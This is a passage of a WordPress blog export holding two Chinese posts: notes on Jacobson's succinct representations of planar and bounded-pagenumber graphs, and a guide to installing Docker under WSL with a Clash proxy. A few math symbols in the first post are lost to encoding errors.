		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81023e1d1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81163e1d2]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Space-efficient Static Trees and Graphs]]></title>
		<link>http://www.ironmanzzm.top/?p=503</link>
		<pubDate>Wed, 29 Nov 2023 04:52:15 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=503</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>Succinct 数据结构是一类使用非常少量的空间来存储数据的结构。与压缩不同的是，Succinct在减少空间存储开销的同时可以进行非常高效的访问操作。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Jacobson的这篇论文提出了针对树和图的Succinct数据结构。树这部分我看到<a href="https://www.zhihu.com/people/wang-ting-zheng-45">@一只硬核少年</a>在<a href="https://zhuanlan.zhihu.com/p/546567867">Space-efficient Static Trees and Graphs</a>这篇文章中做了非常详细的解读。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>图的部分这两天边读边做了些笔记，发出来和大家分享一下。如果有错漏的地方欢迎指正。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">4. 线性空间复杂度的可平面图（Planar Graph）</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Turan等人提出一种使用12个bit表示一个结点的平面图存储方法，证明平面图可以以线性空间复杂度存储；Kannan等人基于Nash-Williams定理，将可平面图分解成三个边不相接的生成树。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>论文中提出一种方法，将可平面图分解成<strong>页（pages）</strong>，从而在线性空间复杂度的表示之上实现高效的搜索和邻接判定。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>首先介绍一下<strong>括号平衡器（Parentheses Blancer）</strong>这个结构。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.1 括号平衡问题</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>问题定义：</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>给定一个由n个括号构成的静态平衡字符串（静态指字符串不会改变），通过构建一个空间占用O(n)的字典来优化下面这个操作：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>在字符串中找到与位置p上的左括号&nbsp;<code>(</code>&nbsp;匹配的右括号&nbsp;<code>)</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>反过来，在位置p上找到与右括号&nbsp;<code>)</code>&nbsp;匹配的左括号&nbsp;<code>(</code>&nbsp;。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>这个问题可以简化为给定左括号找匹配的右括号的问题，因为两种操作是对称的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>首先将字符串分割为&nbsp;<code>log n</code>&nbsp;大小的等长块，每个块从&nbsp;<code>1</code>&nbsp;开始编号，有以下定义：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>括号p被称为<strong>远括号（Far Parenthesis）</strong>，当且仅当p的匹配括号位于其自己所在的块之外。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>远括号被称为<strong>先锋括号（Pionneer）</strong>，当且仅当其匹配括号位于字符串中前一个远括号所在块的不同块中。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>维护以下两个数据结构：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>一个大小为&nbsp;<code>n</code>&nbsp;用于记录第&nbsp;<code>i</code>&nbsp;个括号是否为先锋括号的位图；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>位图对应的rank表；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>一个记录每个先锋括号的匹配括号所在块号的表格；</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://pic4.zhimg.com/80/v2-1f78fe875a8f98569b61725c910a4daf_1440w.webp" alt=""/><figcaption class="wp-element-caption">Figure 4: A structure to balance parentheses.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>如果下标&nbsp;<code>p</code>&nbsp;的括号不是远括号，可以在所属块中做上界为&nbsp;<code>log n</code>&nbsp;线性扫描。否则可以通过索引计算得到匹配括号&nbsp;<code>q</code>&nbsp;所在的块号：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>计算下标为&nbsp;<code>p</code>&nbsp;的括号在先锋括号位图中的&nbsp;<code>rank</code>&nbsp;值&nbsp;<code>rank(p)</code>&nbsp;；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>块号表第&nbsp;<code>rank(p)</code>&nbsp;个元素即&nbsp;<code>q</code>&nbsp;所在的块号。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>为了在块中更快地找到&nbsp;<code>q</code>&nbsp;的准确位置，另外维护一个<strong>记录每个块的嵌套深度（Nesting Depth：字符串前缀中开括号数量超过闭括号数量的总和）的表</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://pic3.zhimg.com/80/v2-59ec32d9982d07f6d3e8d7322534ff02_1440w.webp" alt=""/><figcaption class="wp-element-caption">Figure 4: A structure to balance parentheses.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>在这些索引的帮助下我们可以以&nbsp;<code>O(log n)</code>&nbsp;时间复杂度搜索匹配括号，而且位图、rank表以及嵌套深度表这三个辅助数据结构增加的额外空间开销仅仅是&nbsp;<code>2n+o(n)</code>&nbsp;个bits。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>块号表空间开销和先锋括号的数量有关。每个块号长度为&nbsp;<code>log n</code>&nbsp;个bits，当先锋括号的数量超过&nbsp;<code>n/log n</code>&nbsp;时，块号表的空间开销将超过&nbsp;<code>O(n)</code>&nbsp;。但下面的证明说明在一个划分为&nbsp;<code>b</code>&nbsp;个块的字符串中，先锋括号的数量不会超过&nbsp;<code>2b-3</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>证明如下：</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>首先，假设我们构建一个图，图中的每个节点代表字符串的一个块。将这些节点按顺序排成一条直线，对应着块的顺序。如果一个块中有一个远括号指向另一个块，就在这两个节点之间添加一条边。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>在这样构建的图中，边的数量至少等于字符串中先锋括号的数量，因为每个先锋括号可以映射到不同的边上。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>由于这个括号字符串是平衡的，意味着任意两个块之间的括号匹配是正确的，因此在图中没有边会交叉。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>这样得到的图是一个外平面图（outer-planar），也就是说可以在平面上嵌入这个图，使得所有的节点都在一个面上。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>外平面图的一个已知性质是，其边的数量最多为2b - 3。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>由于块号表中的每个元素都只有&nbsp;<code>lg n</code>&nbsp;个bit长，因此整张表的长度最多&nbsp;<code>[2(n/lg n)-3]*lg n=2n+o(n)</code>&nbsp;个bit.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.2 有界页数图</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在图论中，<strong>有界页数图（Bounded pagenumber graphs）</strong>&nbsp;是一种比平面图抽象程度更高的图，书嵌入是图的平面嵌入到书嵌入的推广。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>定义一：图的k页书嵌入（k-page book embedding）：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>给定一个图G=&lt;V, E&gt;，图的k页书嵌入是点集V的一个<strong>打印排列（点在书脊线上按不同顺序排列的一个排序）</strong>，该排列对应的一种将&nbsp;<code>E</code>&nbsp;划归到&nbsp;<code>k</code>&nbsp;页中的划分，同一页中的任意两边不能相交，且所有划分出的页共享同一个打印排列。（详细请看：[4]）</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><strong>定义二：页数/书厚度（pagenumber/book-thickness）：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>图的所有书嵌入中最小的页数</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>设��是所有页数上界为&nbsp;<code>k</code>&nbsp;的图集合，给定任意图&nbsp;�∈��以及一个该图的k页嵌入，下面会展示以一个在图G中访问邻居和判断是否邻接的方法。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>对于一个n个结点的图G，每次操作只需要访问&nbsp;<code>O(log n)</code>&nbsp;个比特，图的表示使用的比特数是&nbsp;<code>O(kn)</code>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>简单起见下面先讲解单页图（外平面图）的线性空间表示方法，然后再进行扩展。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.2.1 单页图的线性空间表示法</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>单页图中所有边都可以放到沿着某个点排列构成的书脊线的一侧，且任何两条边都不相交。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://pic2.zhimg.com/80/v2-02459597dfd2d7cfd6421f2ee9c78639_1440w.webp" alt=""/><figcaption class="wp-element-caption">Figure 5: One-page graphs as balanced parentheses</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>对于一个有n个结点的单页图，每个结点用一个&nbsp;<code>·</code>&nbsp;表示。单页图中的每条边&nbsp;<code>&lt;u, v&gt;</code>&nbsp;，在 第<code>(u+1)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>个结点前插入一个&nbsp;<code>(</code>&nbsp;符号，第&nbsp;<code>v</code>&nbsp;个结点前插入一个&nbsp;<code>)</code>&nbsp;符号。可以发现这样插入左右括号以后就形成了一个平衡括号串，这个平衡括号串包含&nbsp;<code>·</code>&nbsp;,&nbsp;<code>(</code>&nbsp;以及&nbsp;<code>)</code>&nbsp;三种符号。其中结点数量是&nbsp;<code>n</code>&nbsp;个，左右括号最多分别有&nbsp;<code>2n-3</code>&nbsp;个。第&nbsp;<code>m</code>&nbsp;和&nbsp;<code>m+1</code>&nbsp;个结点之间的所有括号都对应节点&nbsp;<code>m</code>&nbsp;的一条边。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>现在将这个3符号串编码成两个位串：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>标记所有结点所在位置的位图，称之为<strong>结点位图（node-map）</strong>；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>删除结点符号后， 用<code>0</code>&nbsp;表示左括号，&nbsp;<code>1</code>&nbsp;表示右括号的位串。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>两个比特串加起来总共最多需要比特数：</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":509,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.ironmanzzm.top/wp-content/uploads/2023/11/image-1.png" alt="" class="wp-image-509"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>这两个位串是图的线性空间表示的关键。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>接下来构造两个辅助结构：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>括号串的匹配器（matcher for the parentheses string）</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>结点位图的&nbsp;<code>rank/select</code>&nbsp;和&nbsp;<code>rank0/select0</code>&nbsp;表</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>这两个辅助结构会增加额外的空间开销，但总开销不会超过&nbsp;<code>O(n)</code>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>结点在书脊线上的打印顺序可以作为结点的索引下标，括号字符串中的索引下标可以作为边的索引下标。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.2.2 查找与邻接判断</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>有了上面这些数据结构，我们在图G中进行查找比起前面的括号匹配要稍微麻烦一点。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>图G中的每条边都和一对括号对应，沿着一条边走等价于给定左括号的下标查找对应的右括号。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了方便我们定义两个函数：</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":507,"width":"652px","height":"auto","sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full is-resized"><img src="https://www.ironmanzzm.top/wp-content/uploads/2023/11/image.png" alt="" class="wp-image-507" style="width:652px;height:auto"/></figure>
<!-- /wp:image -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>node-to-edge</code>&nbsp;：给定结点编号&nbsp;<code>m</code>，求该从结点出去的第一条边的下标；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>edge-to-node</code>&nbsp;：给定括号串中的一个边下标，找到这条边对应的顶点编号.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>访问结点&nbsp;<code>m</code>&nbsp;邻居结点的算法如下：</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code>e = node-to-edge(m)
while(edge-to-node(e) == m) {
	next_node = paren-match(e)  //找到与e匹配的括号位置
	visit(edge-to-node(next_node))
	e = e+1
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>这个算法只需要常数次数的&nbsp;<code>rank/select</code>&nbsp;以及括号匹配操作，因此每次访问邻居只需要&nbsp;<code>O(log n)</code>&nbsp;次比特访问。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>2. 邻接判断（给定结点&nbsp;<code>u</code>&nbsp;和&nbsp;<code>v</code>&nbsp;，判断是否存在一条边&nbsp;<code>&lt;u, v&gt;</code>&nbsp;连接这两个节点）的操作也可以以&nbsp;<code>O(log n)</code>&nbsp;的时间复杂度进行。详细过程在作者的博士论文[2]中。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.2.3 多页图</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将单页图的线性空间表示法扩展到多页图的方法非常简单：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>如果一个图G是&nbsp;<code>k-page</code>&nbsp;图，将k页分别作为一个单页图表示即可。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>要访问给定节点&nbsp;<code>m</code>&nbsp;的所有邻居只需要分别在&nbsp;<code>k</code>&nbsp;页中执行上面的邻居访问算法即可，判断邻接也是类似。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>可见，任何&nbsp;<code>k-page</code>&nbsp;图都可以在&nbsp;<code>O(kn)</code>&nbsp;空间复杂度下表示，以&nbsp;<code>O(klog n)</code>&nbsp;的时间复杂度搜索和判断邻接。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Yannakakis[3]提出过一个线性时间复杂度的算法，可将任意平面图嵌入到4页以内的书中。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>本论文展示了任意类型的有界页数图都可以通过线性空间表示，这个结论也适用于平面图。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">参考资料</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1] Jacobson, G. (1989, October). Space-efficient static trees and graphs. In&nbsp;<em>30th annual symposium on foundations of computer science</em>&nbsp;(pp. 549-554). IEEE Computer Society.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>[2] Jacobson, G. J. (1988).&nbsp;<em>Succinct static data structures</em>. Carnegie Mellon University.(<a href="https://link.zhihu.com/?target=https%3A//www.proquest.com/docview/303540527%3Fpq-origsite%3Dgscholar%26fromopenview%3Dtrue" target="_blank" rel="noreferrer noopener">PDF</a>)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>[3] Yannakakis, M. (1986, November). Four pages are necessary and sufficient for planar graphs. In&nbsp;<em>Proceedings of the eighteenth annual ACM symposium on theory of computing</em>&nbsp;(pp. 104-108).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>[4]&nbsp;<a href="https://zhuanlan.zhihu.com/p/429222973">图的书嵌入摘录 - 知乎 (zhihu.com)</a></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[Succinct 数据结构是一类使用非常少量的空间来存储数据的结构。与压缩不同的是，Succinct在减少空间存储开销的同时可以进行非常高效的访问操作。Jacobson的这篇论文提出了针对树和图的Succinct数据结构。]]></excerpt:encoded>
		<wp:post_id>503</wp:post_id>
		<wp:post_date><![CDATA[2023-11-29 12:52:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2023-11-29 04:52:15]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2023-11-29 12:54:19]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2023-11-29 04:54:19]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[space-efficient-static-trees-and-graphs]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84"><![CDATA[数据结构]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[504]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-visibility_hide_by_default]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53958ae40]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81023e1d1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53b74f618]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81163e1d2]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_description]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_description]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53c54f619]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[WSL 安装 Docker 并配置 clash 代理]]></title>
		<link>http://www.ironmanzzm.top/?p=512</link>
		<pubDate>Sun, 13 Apr 2025 07:21:32 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/?p=512</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>本文主要介绍以 WSL 形式运行的Ubuntu 22.04 LTS 下安装 docker 并通过宿主机的 clash 代理访问外网的配置流程。 </p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">WSL 网络配置</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>首先编辑 <code>~/.wslconfig</code> ，将网络模式设置为 <code>mirrored</code> ，并关闭 <code>dnsTunneling</code> 。</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">[wsl2]<br>networkingMode=mirrored<br>dnsTunneling=false<br>firewall=true<br>autoProxy=true</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Clash-verge 配置</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在 clash 的设置中启用局域网连接，点击 <code>局域网连接</code> 旁边的小图标可以看到宿主机的本地 IP ，本文以 <code>192.168.8.176</code> 这个 IP 为例，在其他环境下设置时注意替换为自己的本地 IP. 在下面端口一栏可以看到 clash 代理的默认服务端口 <code>7897</code> 。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="" alt="image.png"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":515,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://www.ironmanzzm.top/wp-content/uploads/2025/04/clash-setting-1024x650.png" alt="" class="wp-image-515"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":519,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="http://www.ironmanzzm.top/wp-content/uploads/2025/04/network-interface.png" alt="" class="wp-image-519"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>开启 <code>mirrored</code> 模式后，进入 WSL 中查看到的IP和宿主机IP相同</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":518,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="http://www.ironmanzzm.top/wp-content/uploads/2025/04/ip-address-1.png" alt="" class="wp-image-518"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>使用这个 IP ，以及 clash 的服务端口 <code>7897</code> ，编辑 <code>~/.bashrc</code> 添加环境变量：</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">host_ip=192.168.8.176<br>export http_proxy="http://$host_ip:7897"<br>export https_proxy="http://$host_ip:7897"</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>保存后执行 <code>source ~/.bashrc</code> 使环境变量设置生效。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">APT 安装 Docker</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>接下来准备安装 Docker 相关组件。在正式安装 Docker 引擎之前，需要卸载任何可能冲突的软件包。</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">for pkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker containerd runc; do sudo apt-get remove $pkg; done</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>设置 Docker 的 APT 仓库</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>然后，需要设置 Docker 的 APT 仓库。之后，可以从该仓库安装和更新 Docker。</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"># 添加 Docker 的官方 GPG 密钥：<br>sudo apt-get update<br>sudo apt-get install ca-certificates curl<br>sudo install -m 0755 -d /etc/apt/keyrings<br>sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc<br>sudo chmod a+r /etc/apt/keyrings/docker.asc<br>​<br># 将仓库添加到 Apt 源列表：<br>echo \<br> &nbsp;"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \<br> &nbsp;$(lsb_release -cs) stable" | \<br> &nbsp;sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null<br>sudo apt-get update</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">安装 Docker</h3>
<!-- /wp:heading -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>安装完成后拉取并运行 <code>hello-world</code> 镜像验证安装是否成功：</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">sudo docker run hello-world</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Dockerd 代理配置</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果拉取镜像时报错，说明需要给 docker daemon 另外配置代理：</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">zzm@DESKTOP-D4196DQ:~$ sudo docker run hello-world<br>Unable to find image 'hello-world:latest' locally<br>docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)</pre>
<!-- /wp:preformatted -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>创建目录 <code>sudo mkdir -p /etc/systemd/system/docker.service.d</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>新建配置文件 <code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>，这个文件中将包含环境变量：</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">[Service]<br>Environment="HTTP_PROXY=http://192.168.8.176:7897"<br>Environment="HTTPS_PROXY=http://192.168.8.176:7897"</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>重启服务使新配置生效：</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">sudo systemctl daemon-reload<br>sudo systemctl restart docker</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>检查确认环境变量已经正确配置：</p>
